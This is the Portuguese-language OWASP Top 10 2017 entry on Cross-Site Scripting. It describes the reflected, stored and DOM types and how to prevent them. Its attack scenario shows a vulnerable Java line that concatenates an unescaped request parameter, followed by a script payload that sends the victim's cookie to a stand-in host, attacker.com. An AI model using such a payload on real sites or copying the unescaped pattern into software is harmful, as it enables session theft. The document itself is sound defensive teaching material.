# A7:2017 Cross-Site Scripting (XSS)

| Agentes de Ameaça/Vetores de ataque | Vulnerabilidade de Segurança | Impactos |
| -- | -- | -- |
| Nível de acesso \| Abuso 3 | Prevalência 3 \| Deteção 3 | Técnico 2 \| Negócio |
| Existem ferramentas automáticas capazes de detetar e tirar partido dos três tipos de XSS. Existem ainda _frameworks_, disponibilizadas gratuitamente, capazes de explorar este problema. | XSS é o segundo maior risco no Top 10 da OWASP e cerca de dois terços das aplicações são vulneráveis a este tipo de ataque. Existem ferramentas automáticas capazes de encontrar problemas de XSS em tecnologías bastantes populares como PHP, J2EE / JSP e ASP.NET. | O impacto do XSS é moderado para os tipos Reflected e DOM XSS mas severo para Stored XSS, onde a execução remota de código no navegador da vítima permite ao atacante roubar credenciais, sessões ou até mesmo infetar a máquina da vítima com malware. |

## A Aplicação é Vulnerável?

Existem três tipos de XSS que visam normalmente o navegador dos utilizadores:

* **Reflected XSS**: A aplicação ou API incluem dados de entrada do utilizador
  como parte do HTML de resposta sem que estes tenham sido devidamente validados
  e/ou os caracteres especiais devidamente tratados (_escaping_). Um ataque bem
  sucedido pode permitir ao atacante executar qualquer tipo de código HTML e
  JavaScript no navegador da vítima. Normalmente a vítima terá de seguir um
  endereço malicioso para uma página controlada pelo atacante tal como _watering
  hole websites_, publicidade ou algo semelhante.
* **Stored XSS**: A aplicação ou API armazenam dados de entrada do utilizador de
  forma não tratada (_sanitization_) os quais serão mais tarde acedidos por
  outro utilizador ou administrador. Este tipo de XSS é considerado de risco
  alto ou crítico.
* **DOM XSS**: Tipicamente as _frameworks_ JavaScript, _Single Page
  Applications_ (SPA) e APIs que incluem na página, de forma dinâmica,
  informação controlada pelo atacante, são vulneráveis a DOM XSS. Idealmente a
  aplicação não enviaria informação controlada pelo atacante para as APIs
  JavaScript.

Os ataques típicos de XSS visam o roubo da sessão do utilizador, roubo ou
controlo da conta de utilizador, contornar autenticação de múltiplo fator (MFA),
alteração do DOM por substituição ou alteração de nós (tais como formulários de
autenticação), ataques contra o navegador do utilizador tais como o download de
software malicioso, _key logging_ e outros ataques possíveis do lado do cliente.

## Como Prevenir?

Prevenir ataques de XSS requer a separação dos dados não confiáveis do conteúdo
activo do navegador. Isto é conseguido através da:

* Utilização de _frameworks_ que ofereçam nativamente protecção para XSS tais
  como as versões mais recentes de Ruby on Rails e React JS. É preciso conhecer
  as limitações destes mecanismos de proteção por forma a tratar de forma
  adequada os casos não cobertos.
* Tratamento adequado (_escaping_) da informação não confiável no pedido HTTP
  tendo em conta o contexto onde esta informação irá ser inserida no HTML (body,
  atributo, JavaScript, CSS ou URL) resolve as vulnerabilidades Reflected e
  Stored XSS. O documento [OWASP Cheat Sheet 'XSS Prevention'][1] inclui
  detalhes de como deve ser tratada esta informação.
* Aplicação do _encoding_ adequado com base no contexto de utilização aquando da
  modificação da página no lado do cliente previne o DOM XSS. Quando isto não é
  possível, podemos utilizar algumas das técnicas referidas no documento OWASP
  Cheat Sheet 'XSS Prevention'.
* Adição de [Content Security Policy (CSP)][2] enquanto medida de mitigação de
  XSS. É uma medida eficaz se não existirem outras vulnerabilidades que
  possibilitem a inclusão de código malicioso através de ficheiros locais da
  aplicação (e.g. _path traversal overwrites_ ou dependências vulneráveis
  incluídas a partir de CDNs autorizadas).

## Exemplos de Cenários de Ataque

**Cenário #1**: A aplicação usa informação não confiável na construção do HTML
abaixo, sem validação ou _escaping_:

```Java
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

O atacante altera o parâmetro `CC` no browser para:

```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

Isto irá fazer com que a sessão da vítima seja enviada para a página do
atacante, dando-lhe o controlo sobre a atual sessão do utilizador.

**Nota**: Os atacantes podem tirar partido do XSS para derrotar qualquer
mecanismo de defesa automática contra [Cross-Site Request Forgery (CSRF)][3].

## Referências

### OWASP

* [OWASP Proactive Controls: Encode Data][4]
* [OWASP Proactive Controls: Validate Data][4]
* [OWASP Application Security Verification Standard: V5][5]
* [OWASP Testing Guide: Testing for Reflected XSS][6]
* [OWASP Testing Guide: Testing for Stored XSS][7]
* [OWASP Testing Guide: Testing for DOM XSS][8]
* [OWASP Cheat Sheet: XSS Prevention][1]
* [OWASP Cheat Sheet: DOM based XSS Prevention][9]
* [OWASP Cheat Sheet: XSS Filter Evasion][10]
* [OWASP Java Encoder Project][11]

### Externas

* [CWE-79: Improper neutralization of user supplied input][12]
* [PortSwigger: Client-side template injection][13]

[1]: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
[2]: https://developer.mozilla.org/pt-PT/docs/Web/HTTP/CSP
[3]: https://developer.mozilla.org/pt-PT/docs/Glossary/CSRF
[4]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016
[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project
[6]: https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)
[7]: https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)
[8]: https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)
[9]: https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
[10]: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
[11]: https://www.owasp.org/index.php/OWASP_Java_Encoder_Project
[12]: https://cwe.mitre.org/data/definitions/79.html
[13]: https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection

